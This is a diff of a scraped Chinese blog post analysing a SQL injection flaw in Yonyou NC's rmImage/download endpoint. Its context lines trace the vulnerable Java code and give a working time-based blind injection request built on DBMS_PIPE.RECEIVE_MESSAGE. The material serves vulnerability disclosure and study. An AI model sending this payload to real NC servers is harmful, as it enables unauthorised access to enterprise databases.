@@ -7,9 +7,17 @@ asset_dir: assets/用友nc-rmimagedownload-sql注入漏洞
 # 用友NC rmImage/download sql注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/2/12 18:40
-- 1020浏览
+- 1021浏览
 - [0评论](#comment)
 - 2小时阅读
+
+深入探索
+
+Server
+
+SQL
+
+sql
 
 ---
 
@@ -156,7 +164,7 @@ public class RMImageAction extends BaseAction {
 
 pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下
 
-漏洞扫描服务
+漏洞预警服务
 
 ```
 private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
@@ -210,7 +218,7 @@ public <T> T queryBillOfVOByPK(Class<T> voClass, String billPK, boolean bLazyLoa
 
 pk\_psndoc ==>pk ==>billPK 又代入 (new MDBaseDAO()).queryBillOfVOByPK 函数
 
-SQL注入防护
+SQL注入检测工具
 
 ```
 public Object queryBillOfVOByPK(Class voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
@@ -300,7 +308,7 @@ Host: nc65.mrxn.net
 
 漏洞利用示例
 
-漏洞扫描服务
+漏洞预警服务
 
 ```
 GET /portal/pt/rmImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',6)-- HTTP/1.1
@@ -344,3 +352,5 @@ xxxxJFIFxxC
 ![](data:image/png;base64,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)
 
 手机扫码阅读
+
+安全运维咨询
